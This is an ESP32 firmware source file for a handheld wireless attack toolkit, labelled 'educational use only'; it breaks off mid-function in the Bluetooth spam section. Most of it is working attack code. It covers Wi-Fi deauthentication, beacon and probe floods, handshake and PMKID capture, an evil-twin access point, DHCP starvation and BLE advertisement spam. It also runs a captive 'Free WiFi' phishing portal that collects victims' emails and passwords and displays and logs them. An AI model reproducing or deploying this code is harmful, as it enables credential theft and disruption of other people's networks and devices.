/*
 * ============================================================================
 *  ESP32 ULTIMATE SECURITY TOOLKIT - FINAL (Evil Portal with OLED credential display)
 * ============================================================================
 *  Hardware: ESP32 Dev Module + OLED 128x64 (I2C) + 5 buttons (12,13,14,15,16)
 *            nRF24L01+ (CE=4, CSN=5) – auto‑detected
 *  
 *  Features:
 *    - Smart scan: WiFi scan → select AP → sub‑menu with host discovery (ARP), port scan, packet counter, service scan
 *    - 30+ attacks (deauth, probe, beacon flood with 13 fake APs, evil twin, DHCP starvation, BLE spam, nRF24 jamming)
 *    - Evil portal with modern CSS, password protection, **live credential display on OLED**
 *    - About tab with detailed system info (RAM, flash, uptime, etc.)
 *    - Fast, responsive, no screen freeze
 *  
 *  ⚠️ EDUCATIONAL USE ONLY – USE RESPONSIBLY ⚠️
 * ============================================================================
 */

#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include "esp_wifi.h"
#include "esp_wifi_types.h"
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include <vector>
#include <SPI.h>
#include <RF24.h>
#include <BLEDevice.h>
#include <BLEAdvertising.h>
#include <BLEUtils.h>
#include <esp_system.h>
#include <esp_heap_caps.h>
#include <esp_chip_info.h>

// ==================== OLED & 5 Buttons ====================
#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64
#define OLED_RESET -1
Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);

#define BTN_UP    32
#define BTN_DOWN  33
#define BTN_LEFT  25
#define BTN_RIGHT 26
#define BTN_OK    27

// ==================== nRF24L01 ====================
#define CE_PIN    4
#define CSN_PIN   5
RF24 radio(CE_PIN, CSN_PIN);
bool nrf24Present = false;

// ==================== Data Structures ====================
struct WiFiNetwork {
  String ssid;
  uint8_t bssid[6];
  int32_t rssi;
  uint8_t channel;
};
struct StationInfo {
  uint8_t mac[6];
  int32_t rssi;
};
std::vector<WiFiNetwork> networks;
std::vector<StationInfo> stations;
int selectedNet = -1, selectedStation = -1;
bool scanning = false;
uint8_t targetBSSID[6], broadcastMac[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};

// ==================== Scanning Results Storage ====================
std::vector<IPAddress> discoveredHosts;
std::vector<int> openPorts;
unsigned long packetCount = 0;
bool packetSniffActive = false;

// ==================== Menu System ====================
enum State {
  MAIN,
  WIFI_SCAN_RESULTS,        // after SSID scan
  AFTER_SELECT_NET,         // submenu after selecting a network
  HOST_DISCOVERY, PORT_SCAN, PKT_COUNTER, SERVICE_SCAN,  // sub‑sub‑menus
  WIFI_MAIN, WIFI_DEAUTH, WIFI_PROBE, WIFI_BEACON, WIFI_SNIFF, WIFI_OTHER,
  BT_MAIN, BT_SPAM, BT_BEACON, BT_OTHER,
  NRF_MENU, NRF_JAM, NRF_SNIFF,
  COMBINED_MENU,
  SETTINGS, ABOUT
};
State state = MAIN;
int cursor = 0;
bool attackActive = false;

// Menu texts (short)
const char* mainItems[] = {"Scan WiFi", "WiFi Attacks", "BT Attacks", "nRF24", "Combined", "Settings"};
const int mainCount = 6;

const char* afterSelectNetItems[] = {"Host Discovery", "Port Scan", "Packet Counter", "Service Scan", "< Back"};
const int afterSelectNetCount = 5;

const char* wifiMain[] = {"Deauth", "Probe", "Beacon", "Sniffer", "Other", "< Back"};
const int wifiMainCount = 6;
const char* deauthItems[] = {"Deauth St", "Deauth All", "Rand MAC", "Deauth Loop", "< Back"};
const int deauthCount = 5;
const char* probeItems[] = {"Probe Rand", "Probe Cust", "< Back"};
const int probeCount = 3;
const char* beaconItems[] = {"Beacon 13", "Beacon Cust", "< Back"};
const int beaconCount = 3;
const char* sniffItems[] = {"Sniffer", "PMKID", "< Back"};
const int sniffCount = 3;
const char* otherWifi[] = {"Chan Hop", "Evil Portal", "SignalMon", "Evil Twin", "DHCP Starve", "< Back"};
const int otherCount = 6;

const char* btMain[] = {"Spam", "Beacons", "Other", "< Back"};
const int btMainCount = 4;
const char* btSpam[] = {"Name Spam", "Apple", "Eddystone", "ScanResp", "DevInfo", "< Back"};
const int btSpamCount = 6;
const char* btBeacon[] = {"iBeacon", "AltBeacon", "< Back"};
const int btBeaconCount = 3;
const char* btOther[] = {"BLE Jammer", "Conn Flood", "< Back"};
const int btOtherCount = 3;

const char* nrfMain[] = {"Jammer", "Sniffer", "< Back"};
const int nrfMainCount = 3;
const char* nrfJam[] = {"Single Jam", "Hop Jam", "< Back"};
const int nrfJamCount = 3;
const char* nrfSniffItems[] = {"Pkt Sniffer", "ShockBurst", "ACK Flood", "< Back"};
const int nrfSniffCount = 4;

const char* combinedItems[] = {"Deauth+EvilTwin", "HS+PMKID", "BLE+WiFi Spam", "nRF24+WiFi Jam", "< Back"};
const int combinedCount = 5;

const char* settingsItems[] = {"About", "< Back"};
const int settingsCount = 2;

// ==================== Evil Twin & Sniffer Globals ====================
DNSServer dnsServer;
WebServer webServer(80);
String capturedEmail = "";
String capturedPassword = "";
String connectedClientMAC = "";
unsigned long lastClientUpdate = 0;
static unsigned long handshakeCount = 0;
static bool handshakeActive = false;

// ==================== Helper Functions ====================
void ensureAPInterface() {
  static bool apStarted = false;
  if (!apStarted) {
    WiFi.softAP("ESP_Tool", NULL, 1, 1);
    apStarted = true;
    delay(100);
  }
  esp_wifi_set_promiscuous(false);
  delay(10);
  esp_wifi_set_protocol(WIFI_IF_AP, WIFI_PROTOCOL_11B | WIFI_PROTOCOL_11G | WIFI_PROTOCOL_11N);
  delay(10);
}

void handshakeSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (!handshakeActive) return;
  wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t*)buf;
  uint8_t *payload = pkt->payload;
  int len = pkt->rx_ctrl.sig_len;
  if (len < 50) return;
  if (payload[0] == 0x88 && payload[1] == 0x8E) {
    handshakeCount++;
    display.fillRect(0,40,128,24,SSD1306_BLACK);
    display.setCursor(0,40);
    display.print("HS #"); display.println(handshakeCount);
    display.display();
  }
}

void packetCounterCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (!packetSniffActive) return;
  packetCount++;
  if (packetCount % 100 == 0) {
    display.fillRect(0,40,128,24,SSD1306_BLACK);
    display.setCursor(0,40);
    display.print("Pkts: "); display.println(packetCount);
    display.display();
  }
}

void sendDeauth(uint8_t* bssid, uint8_t* dest, uint8_t channel) {
  ensureAPInterface();
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  uint8_t packet[26] = {0};
  packet[0] = 0xC0; packet[1] = 0x00;
  memcpy(&packet[4], dest, 6);
  memcpy(&packet[10], bssid, 6);
  memcpy(&packet[16], bssid, 6);
  packet[24] = 0x07; packet[25] = 0x00;
  esp_wifi_80211_tx(WIFI_IF_AP, packet, 26, false);
}

// ==================== WiFi Attack Functions ====================
void attackDeauth(bool broadcast, bool randomMac = false) {
  if (selectedNet < 0) { errorMsg("No net selected. Please scan and select an AP first."); return; }
  WiFiNetwork& net = networks[selectedNet];
  display.clearDisplay(); display.setCursor(0,0);
  display.println("=== DEAUTH ===");
  display.print("AP: "); display.println(net.ssid.substring(0,10));
  if (!broadcast && selectedStation>=0) {
    display.print("ST: ");
    display.printf("%02X%02X%02X", stations[selectedStation].mac[3], stations[selectedStation].mac[4], stations[selectedStation].mac[5]);
  } else display.println("Mode: ALL");
  if (randomMac) display.println("Rand MAC");
  display.println("\nOK=Start LEFT=Cancel");
  display.display();
  while (true) {
    if (digitalRead(BTN_OK)==LOW) break;
    if (digitalRead(BTN_LEFT)==LOW) return;
    delay(50);
  }
  delay(300);
  display.clearDisplay();
  display.println("DEAUTH RUNNING\nOK=STOP");
  display.display();
  ensureAPInterface();
  esp_wifi_set_promiscuous(true);
  unsigned long count = 0;
  attackActive = true;
  while (attackActive) {
    if (digitalRead(BTN_OK)==LOW) { attackActive = false; break; }
    uint8_t* dest = broadcast ? broadcastMac : (selectedStation>=0 ? stations[selectedStation].mac : broadcastMac);
    if (randomMac) {
      uint8_t fake[6]; for(int i=0;i<6;i++) fake[i]=random(256);
      sendDeauth(net.bssid, fake, net.channel);
    } else sendDeauth(net.bssid, dest, net.channel);
    count++;
    if (count % 500 == 0) {
      display.fillRect(0,40,128,24,SSD1306_BLACK);
      display.setCursor(0,40);
      display.print("Pkts: "); display.println(count);
      display.display();
    }
    delay(1);
  }
  esp_wifi_set_promiscuous(false);
  display.clearDisplay();
  display.print("Stopped. Pkts: "); display.println(count);
  display.display();
  delay(1500);
}

void attackDeauthReconnectLoop() { attackDeauth(true, false); }

void attackProbeFlood(bool custom) {
  display.clearDisplay(); display.println("=== PROBE ===");
  display.println("OK=Start");
  while (digitalRead(BTN_OK)!=LOW) delay(50);
  delay(300);
  display.clearDisplay();
  display.println("PROBE RUNNING\nOK=STOP");
  display.display();
  ensureAPInterface();
  esp_wifi_set_promiscuous(true);
  unsigned long count = 0;
  attackActive = true;
  while (attackActive) {
    if (digitalRead(BTN_OK)==LOW) { attackActive = false; break; }
    for (int ch=1; ch<=11; ch++) {
      esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
      uint8_t probe[28] = {0};
      probe[0] = 0x40; probe[1] = 0x00;
      memset(&probe[4], 0xFF, 6);
      for (int j=10; j<16; j++) probe[j] = random(256);
      probe[24] = 0x00; probe[25] = 0x00;
      esp_wifi_80211_tx(WIFI_IF_AP, probe, 28, false);
      count++;
      if (count % 200 == 0) {
        display.fillRect(0,40,128,24,SSD1306_BLACK);
        display.setCursor(0,40);
        display.print("Pkts: "); display.println(count);
        display.display();
      }
      delay(1);
    }
  }
  esp_wifi_set_promiscuous(false);
  display.clearDisplay();
  display.print("Stopped. Pkts: "); display.println(count);
  display.display();
  delay(1500);
}

void attackBeaconFlood(bool custom, int numSSIDs = 13) {
  display.clearDisplay(); display.println("=== BEACON ===");
  display.println("OK=Start");
  while (digitalRead(BTN_OK)!=LOW) delay(50);
  delay(300);
  display.clearDisplay();
  display.println("BEACON RUNNING\nOK=STOP");
  display.display();
  ensureAPInterface();
  esp_wifi_set_promiscuous(true);
  const char* fakeSSIDs[] = {
    "FreeWiFi","Starbucks","Airport","Public","Guest","CafeNet","Library","Hotel","Mall","Hotspot",
    "Verizon","AT&T","Xfinity"
  };
  int used = numSSIDs > 13 ? 13 : numSSIDs;
  unsigned long count = 0;
  attackActive = true;
  int channels[] = {1, 6, 11};
  while (attackActive) {
    if (digitalRead(BTN_OK)==LOW) { attackActive = false; break; }
    for (int ci=0; ci<3; ci++) {
      int ch = channels[ci];
      esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
      for (int i=0; i<used; i++) {
        uint8_t beacon[109] = {0};
        beacon[0] = 0x80; beacon[1] = 0x00;
        memset(&beacon[4], 0xFF, 6);
        for (int j=10; j<16; j++) beacon[j] = random(256);
        memcpy(&beacon[16], &beacon[10], 6);
        beacon[36] = 0x00; beacon[37] = strlen(fakeSSIDs[i]);
        memcpy(&beacon[38], fakeSSIDs[i], strlen(fakeSSIDs[i]));
        beacon[106] = 0x03; beacon[107] = 0x01; beacon[108] = ch;
        esp_wifi_80211_tx(WIFI_IF_AP, beacon, 109, false);
        count++;
        if (!attackActive) break;
        delay(5);
      }
      if (!attackActive) break;
    }
    display.fillRect(0,40,128,24,SSD1306_BLACK);
    display.setCursor(0,40);
    display.print("Pkts: "); display.println(count);
    display.display();
  }
  esp_wifi_set_promiscuous(false);
  display.clearDisplay();
  display.print("Stopped. Pkts: "); display.println(count);
  display.display();
  delay(1500);
}

void attackHandshakeSniffer() {
  if (selectedNet < 0) { errorMsg("No net selected. Scan first."); return; }
  WiFiNetwork& net = networks[selectedNet];
  display.clearDisplay();
  display.print("Target: "); display.println(net.ssid.substring(0,10));
  display.println("OK=Start");
  while (digitalRead(BTN_OK)!=LOW) delay(50);
  delay(300);
  display.clearDisplay();
  display.println("SNIFFING...\nDeauth to force\nOK=STOP");
  display.display();
  ensureAPInterface();
  handshakeCount = 0; handshakeActive = true; attackActive = true;
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(handshakeSnifferCallback);
  esp_wifi_set_channel(net.channel, WIFI_SECOND_CHAN_NONE);
  while (attackActive) {
    if (digitalRead(BTN_OK)==LOW) { attackActive = false; break; }
    delay(100);
  }
  handshakeActive = false;
  esp_wifi_set_promiscuous(false);
  display.clearDisplay();
  display.print("Stopped\nEAPOL: "); display.println(handshakeCount);
  display.display();
  delay(1500);
}

void attackPMKIDCapture() {
  if (selectedNet < 0) { errorMsg("No net selected. Scan first."); return; }
  WiFiNetwork& net = networks[selectedNet];
  display.clearDisplay();
  display.print("Target: "); display.println(net.ssid.substring(0,10));
  display.println("OK=Start");
  while (digitalRead(BTN_OK)!=LOW) delay(50);
  delay(300);
  display.clearDisplay();
  display.println("PMKID CAPTURE\nOK=STOP");
  display.display();
  ensureAPInterface();
  handshakeCount = 0; handshakeActive = true; attackActive = true;
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(handshakeSnifferCallback);
  esp_wifi_set_channel(net.channel, WIFI_SECOND_CHAN_NONE);
  unsigned long start = millis();
  while (attackActive && (millis()-start) < 30000) {
    sendDeauth(net.bssid, broadcastMac, net.channel);
    if (digitalRead(BTN_OK)==LOW) break;
    delay(10);
  }
  attackActive = false; handshakeActive = false;
  esp_wifi_set_promiscuous(false);
  display.clearDisplay();
  display.print("Done\nEAPOL: "); display.println(handshakeCount);
  display.display();
  delay(1500);
}

void attackChannelHopper() {
  display.clearDisplay();
  display.println("=== CH HOPPER ===");
  display.println("OK=Start");
  while (digitalRead(BTN_OK)!=LOW) delay(50);
  delay(300);
  display.clearDisplay();
  display.println("HOPPING\nOK=STOP");
  display.display();
  ensureAPInterface();
  esp_wifi_set_promiscuous(true);
  attackActive = true;
  unsigned long count = 0;
  uint8_t ch = 1;
  while (attackActive) {
    if (digitalRead(BTN_OK)==LOW) { attackActive = false; break; }
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    for (int i=0;i<10;i++) { sendDeauth(broadcastMac, broadcastMac, ch); count++; }
    ch++; if (ch>11) ch=1;
    display.fillRect(0,40,128,24,SSD1306_BLACK);
    display.setCursor(0,40);
    display.print("Pkts: "); display.println(count);
    display.display();
    delay(10);
  }
  esp_wifi_set_promiscuous(false);
  display.clearDisplay();
  display.print("Stopped. Pkts: "); display.println(count);
  display.display();
  delay(1500);
}

// ==================== Evil Portal (modern HTML/CSS + OLED credential display) ====================
void startEvilPortal() {
  display.clearDisplay();
  display.println("=== EVIL PORTAL ===");
  display.println("AP: FreeWiFi");
  display.println("OK=Start");
  while (digitalRead(BTN_OK)!=LOW) delay(50);
  delay(300);
  webServer.stop(); dnsServer.stop(); WiFi.softAPdisconnect(true); delay(100);
  WiFi.softAP("FreeWiFi", NULL, 6, 0); delay(100);
  dnsServer.start(53, "*", WiFi.softAPIP());

  // Modern HTML/CSS login page
  String html = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
  <meta name='viewport' content='width=device-width, initial-scale=1.0'>
  <title>Free WiFi</title>
  <style>
    *{margin:0;padding:0;box-sizing:border-box;}
    body{font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);min-height:100vh;display:flex;justify-content:center;align-items:center;}
    .card{background:rgba(255,255,255,0.95);border-radius:20px;padding:40px 30px;width:90%;max-width:400px;box-shadow:0 15px 35px rgba(0,0,0,0.2);text-align:center;backdrop-filter:blur(10px);}
    .card h1{color:#333;margin-bottom:10px;font-size:28px;}
    .card p{color:#666;margin-bottom:30px;}
    input{width:100%;padding:14px 18px;margin:10px 0;border:1px solid #ddd;border-radius:30px;font-size:16px;transition:0.3s;}
    input:focus{outline:none;border-color:#667eea;box-shadow:0 0 8px rgba(102,126,234,0.3);}
    button{width:100%;padding:14px;background:linear-gradient(135deg,#667eea,#764ba2);color:white;border:none;border-radius:30px;font-size:18px;font-weight:bold;cursor:pointer;margin-top:15px;}
    button:hover{transform:scale(1.02);}
    .footer{margin-top:25px;font-size:12px;color:#999;}
  </style>
</head>
<body>
  <div class='card'>
    <h1>✨ Free WiFi ✨</h1>
    <p>Sign in to access high-speed internet</p>
    <form action='/get' method='get'>
      <input type='text' name='email' placeholder='Email address' required>
      <input type='password' name='password' placeholder='Password' required>
      <button type='submit'>Connect</button>
    </form>
    <div class='footer'>By continuing you agree to our terms</div>
  </div>
</body>
</html>
)rawliteral";

  webServer.on("/", [html]() { webServer.send(200, "text/html", html); });
  webServer.on("/get", []() {
    capturedEmail = webServer.arg("email");
    capturedPassword = webServer.arg("password");
    // Display credentials on OLED in clear text
    display.clearDisplay();
    display.setCursor(0,0);
    display.println("=== CREDENTIALS ===");
    display.print("Email: "); display.println(capturedEmail.substring(0,12));
    display.print("Pass: "); display.println(capturedPassword.substring(0,12));
    display.display();
    // Also print to Serial for logging
    Serial.println("========== CREDENTIALS CAPTURED ==========");
    Serial.print("Email: "); Serial.println(capturedEmail);
    Serial.print("Password: "); Serial.println(capturedPassword);
    Serial.println("==========================================");
    // Send success page to victim
    webServer.send(200, "text/html", "<!DOCTYPE html><html><head><meta http-equiv='refresh' content='3;url=http://www.google.com'><style>body{font-family:sans-serif;text-align:center;padding:50px;background:#4CAF50;color:white;}h1{font-size:40px;}</style></head><body><h1>✅ Connected!</h1><p>Redirecting...</p></body></html>");
  });
  webServer.onNotFound([]() { webServer.sendHeader("Location", "http://192.168.4.1/", true); webServer.send(302, "text/plain", ""); });
  webServer.begin();

  attackActive = true; lastClientUpdate = 0;
  display.clearDisplay();
  display.println("PORTAL ACTIVE\nAP: FreeWiFi\nIP:192.168.4.1\nOK=STOP");
  display.display();
  while (attackActive) {
    dnsServer.processNextRequest(); webServer.handleClient();
    if (millis() - lastClientUpdate > 2000) {
      lastClientUpdate = millis();
      wifi_sta_list_t sta; esp_wifi_ap_get_sta_list(&sta);
      int num = sta.num;
      display.fillRect(0,48,128,16,SSD1306_BLACK);
      display.setCursor(0,48);
      display.print("Clients: "); display.print(num);
      if (num>0) display.printf(" MAC:%02X%02X%02X", sta.sta[0].mac[3], sta.sta[0].mac[4], sta.sta[0].mac[5]);
      display.display();
    }
    if (digitalRead(BTN_OK)==LOW) break;
    delay(10);
  }
  webServer.stop(); dnsServer.stop(); WiFi.softAPdisconnect(true);
  display.clearDisplay();
  display.println("Portal stopped");
  if (capturedPassword.length()>0) display.println("Creds saved");
  else display.println("No creds");
  display.display();
  delay(1500);
}

void attackSignalMonitor() {
  if (selectedNet < 0) { errorMsg("No net selected. Scan first."); return; }
  WiFiNetwork& net = networks[selectedNet];
  display.clearDisplay();
  display.println("=== SIGNAL MON ===");
  display.print("AP: "); display.println(net.ssid.substring(0,10));
  display.println("OK=Start LEFT=Cancel");
  display.display();
  while (true) {
    if (digitalRead(BTN_OK)==LOW) break;
    if (digitalRead(BTN_LEFT)==LOW) return;
    delay(50);
  }
  delay(300);
  attackActive = true;
  while (attackActive) {
    if (digitalRead(BTN_OK)==LOW) break;
    int rssi = WiFi.RSSI();
    int bar = constrain(map(rssi, -90, -30, 0, 60), 0, 60);
    display.fillRect(0,0,128,64,SSD1306_BLACK);
    display.setCursor(0,0);
    display.print("RSSI: "); display.print(rssi); display.println(" dBm");
    display.fillRect(0, 20, bar, 15, SSD1306_WHITE);
    display.display();
    delay(500);
  }
  display.clearDisplay(); display.println("Monitor stopped"); display.display(); delay(1500);
}

// ==================== Enhanced Evil Twin ====================
void attackEvilTwin() {
  if (selectedNet < 0) { errorMsg("No net selected. Scan first."); return; }
  WiFiNetwork& net = networks[selectedNet];
  display.clearDisplay();
  display.println("=== EVIL TWIN ===");
  display.print("Clone: "); display.println(net.ssid.substring(0,10));
  display.println("Enter password for AP");
  display.println("OK to set (default: 12345678)");
  display.display();
  while (digitalRead(BTN_OK)!=LOW) delay(50);
  delay(300);
  String apPassword = "12345678";
  webServer.stop(); dnsServer.stop(); WiFi.softAPdisconnect(true); delay(100);
  WiFi.softAP(net.ssid.c_str(), apPassword.c_str(), net.channel, 0);
  delay(100);
  dnsServer.start(53, "*", WiFi.softAPIP());
  webServer.on("/", []() { webServer.send(200, "text/html", "<h2>Connected to WiFi</h2><p>You are now online.</p>"); });
  webServer.on("/get", []() { webServer.send(200, "text/html", "OK"); });
  webServer.begin();
  attackActive = true;
  display.clearDisplay();
  display.println("EVIL TWIN ACTIVE\nAP: "); display.println(net.ssid.substring(0,10));
  display.println("PWD: " + apPassword);
  display.println("OK=STOP");
  display.display();
  while (attackActive) {
    dnsServer.processNextRequest(); webServer.handleClient();
    wifi_sta_list_t sta; esp_wifi_ap_get_sta_list(&sta);
    if (sta.num > 0) {
      connectedClientMAC = "";
      for (int i=0; i<sta.num; i++) {
        char mac[18];
        sprintf(mac, "%02X:%02X:%02X:%02X:%02X:%02X", sta.sta[i].mac[0], sta.sta[i].mac[1], sta.sta[i].mac[2], sta.sta[i].mac[3], sta.sta[i].mac[4], sta.sta[i].mac[5]);
        connectedClientMAC += mac;
        connectedClientMAC += " ";
      }
      display.fillRect(0,40,128,24,SSD1306_BLACK);
      display.setCursor(0,40);
      display.print("Client: "); display.println(connectedClientMAC.substring(0,12));
      display.display();
    }
    if (digitalRead(BTN_OK)==LOW) break;
    delay(100);
  }
  webServer.stop(); dnsServer.stop(); WiFi.softAPdisconnect(true);
  display.clearDisplay(); display.println("Evil Twin stopped"); display.display(); delay(1500);
}

// ==================== DHCP Starvation (faster) ====================
void attackDHCPStarvation() {
  display.clearDisplay(); display.println("=== DHCP STARVE ===");
  display.println("OK=Start (needs AP)");
  display.display();
  while (digitalRead(BTN_OK)!=LOW) delay(50);
  delay(300);
  display.clearDisplay(); display.println("Sending DHCP requests\nOK=STOP");
  display.display();
  attackActive = true;
  unsigned long count = 0;
  WiFiUDP udp;
  udp.begin(68);
  while (attackActive) {
    if (digitalRead(BTN_OK)==LOW) break;
    uint8_t dhcpDiscover[] = {
      0x01, 0x01, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x63, 0x82, 0x53, 0x63,
      0x35, 0x01, 0x01, 0xff
    };
    udp.beginPacket(IPAddress(255,255,255,255), 67);
    udp.write(dhcpDiscover, sizeof(dhcpDiscover));
    udp.endPacket();
    count++;
    if (count % 100 == 0) {
      display.fillRect(0,40,128,24,SSD1306_BLACK);
      display.setCursor(0,40);
      display.print("Packets: "); display.println(count);
      display.display();
    }
    delay(1);
  }
  udp.stop();
  display.clearDisplay(); display.print("Stopped. Pkts: "); display.println(count);
  display.display(); delay(1500);
}

// ==================== Scanning Functions (SSID scan + host discovery) ====================
void scanWiFiNetworks() {
  display.clearDisplay(); display.println("Scanning WiFi..."); display.display();
  networks.clear();
  int n = WiFi.scanNetworks();
  if (n == 0) { display.println("No networks"); display.display(); delay(1500); return; }
  for (int i=0; i<n; i++) {
    WiFiNetwork net;
    net.ssid = WiFi.SSID(i);
    net.rssi = WiFi.RSSI(i);
    net.channel = WiFi.channel(i);
    memcpy(net.bssid, WiFi.BSSID(i), 6);
    networks.push_back(net);
  }
  state = WIFI_SCAN_RESULTS;
  cursor = 0;
}

void drawWiFiScanResults() {
  display.clearDisplay();
  display.setCursor(0,0);
  display.println("=== NETWORKS ===");
  int start = max(0, cursor-3);
  int end = min((int)networks.size(), start+7);
  for (int i=start; i<end; i++) {
    int y = (i-start)*8 + 16;
    if (i == cursor) {
      display.fillRect(0, y, 128, 8, SSD1306_WHITE);
      display.setTextColor(SSD1306_BLACK);
    } else {
      display.setTextColor(SSD1306_WHITE);
    }
    display.setCursor(2, y);
    String name = networks[i].ssid.length()>9 ? networks[i].ssid.substring(0,9) : networks[i].ssid;
    display.print(name); display.print(" "); display.print(networks[i].channel);
    display.setTextColor(SSD1306_WHITE);
  }
  display.display();
}

void selectNetwork(int idx) {
  if (idx<0 || idx>=(int)networks.size()) return;
  selectedNet = idx;
  WiFiNetwork& net = networks[idx];
  display.clearDisplay();
  display.print("Selected: "); display.println(net.ssid.substring(0,12));
  display.println("Scanning stations...");
  display.display();
  stations.clear(); scanning = true;
  memcpy(targetBSSID, net.bssid, 6);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb([](void* buf, wifi_promiscuous_pkt_type_t type) {
    if (!scanning) return;
    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t*)buf;
    if (pkt->rx_ctrl.sig_len < 24) return;
    uint8_t *payload = pkt->payload;
    uint8_t *addr1 = payload+4, *addr2 = payload+10;
    bool toAP = (memcmp(addr1, targetBSSID,6)==0);
    bool fromAP = (memcmp(addr2, targetBSSID,6)==0);
    if (!toAP && !fromAP) return;
    uint8_t* station = toAP ? addr2 : addr1;
    if (station[0]&0x01) return;
    if (memcmp(station, targetBSSID,6)==0) return;
    for (auto &s : stations) if (memcmp(s.mac, station,6)==0) return;
    StationInfo st; memcpy(st.mac, station,6); st.rssi = pkt->rx_ctrl.rssi;
    stations.push_back(st);
  });
  esp_wifi_set_channel(net.channel, WIFI_SECOND_CHAN_NONE);
  delay(5000);
  esp_wifi_set_promiscuous(false);
  scanning = false;
  display.clearDisplay(); display.print("Found "); display.print(stations.size()); display.println(" stations"); display.display(); delay(1000);
  // After selecting, go to the sub‑menu for host discovery etc.
  state = AFTER_SELECT_NET;
  cursor = 0;
}

// ==================== Host Discovery (powerful ARP scan) ====================
void hostDiscovery() {
  display.clearDisplay(); display.println("Host Discovery\nARP scan..."); display.display();
  discoveredHosts.clear();
  IPAddress gateway = WiFi.gatewayIP();
  for (int i=1; i<254; i++) {
    IPAddress target(gateway[0], gateway[1], gateway[2], i);
    WiFiClient client;
    if (client.connect(target, 1, 100)) {
      discoveredHosts.push_back(target);
      client.stop();
    }
    if (digitalRead(BTN_OK)==LOW) break;
    if (i % 20 == 0) {
      display.fillRect(0,40,128,24,SSD1306_BLACK);
      display.setCursor(0,40);
      display.print("Scanning... "); display.println(i);
      display.display();
    }
  }
  display.clearDisplay(); display.print("Found "); display.print(discoveredHosts.size()); display.println(" hosts"); display.display(); delay(2000);
  state = AFTER_SELECT_NET;
}

void portScan() {
  display.clearDisplay(); display.println("Port Scan\nGateway: "); display.println(WiFi.gatewayIP()); display.display();
  openPorts.clear();
  int commonPorts[] = {21,22,23,25,53,80,110,143,443,445,993,995,3389,8080};
  for (int i=0; i<14; i++) {
    WiFiClient client;
    if (client.connect(WiFi.gatewayIP(), commonPorts[i], 100)) {
      openPorts.push_back(commonPorts[i]);
      client.stop();
    }
    display.fillRect(0,40,128,24,SSD1306_BLACK);
    display.setCursor(0,40);
    display.print("Scanning port "); display.println(commonPorts[i]);
    display.display();
  }
  display.clearDisplay(); display.print("Open ports: "); for (int p : openPorts) { display.print(p); display.print(" "); } display.display(); delay(2000);
  state = AFTER_SELECT_NET;
}

void livePacketCounter() {
  display.clearDisplay(); display.println("Live Packet Counter\nOK=Start"); display.display();
  while (digitalRead(BTN_OK)!=LOW) delay(50);
  delay(300);
  display.clearDisplay(); display.println("Counting packets...\nOK=STOP"); display.display();
  packetCount = 0;
  packetSniffActive = true;
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(packetCounterCallback);
  attackActive = true;
  while (attackActive) {
    if (digitalRead(BTN_OK)==LOW) break;
    delay(100);
  }
  packetSniffActive = false;
  esp_wifi_set_promiscuous(false);
  display.clearDisplay(); display.print("Total packets: "); display.println(packetCount); display.display(); delay(2000);
  state = AFTER_SELECT_NET;
}

void serviceScan() {
  display.clearDisplay(); display.println("Service Scan\n(placeholder)"); display.display();
  delay(1500);
  state = AFTER_SELECT_NET;
}

// ==================== Bluetooth Attacks ====================
void bleNameSpam() {
  display.clearDisplay(); display.println("=== NAME SPAM ==="); display.println("OK=Start");
  while (digitalRead(BTN_OK)!=LOW) delay(50); delay(300);
  BLEDevice::init("ESP32_BLE_Spam");
  BLEAdvertising* pAdv = BLEDevice::getAdvertising();
  pAdv->setScanResponse(true);
  const char* names[] = {"AirPods","GalaxyBuds","MiBand","Fitbit","JBL","Sony","Bose","Beats","Huawei","Garmin","Amazfit","Oura","Tile","Chipolo","AppleWatch","PixelBuds"};
  int num = 16;
  display.clearDisplay(); display.println("BLE SPAM ACTIVE\nOK=STOP"); display.display();
  attackActive = true; int idx=0;
  while (attackActive) {
    if (digitalRead(BTN_OK)==LOW) break;
    BLEAdvertisementData adv; adv.setName(names[idx%num]);
    pAdv->setAdvertisementData(adv); pAdv->start(); delay(100); pAdv->stop();
    idx++; display.fillRect(0,40,128,24,SSD1306_BLACK); display.setCursor(0,40);
    display.print("Pkts: "); display.println(idx); display.display();
  }
  pAdv->stop(); BLEDevice::deinit(); display.clearDisplay(); display.println("Stopped"); display.display(); delay(1500);
}

void appleContinuitySpam() {
  display.clearDisplay(); display.println("=== APPLE SPAM ==="); display.println("OK=Start");
  while (digitalRead(BTN_OK)!=LOW) delay(50); delay(300);
  BLEDevice::init("Apple_Spam");
  BLEAdvertising* pAdv = BLEDevice::getAdvertising();
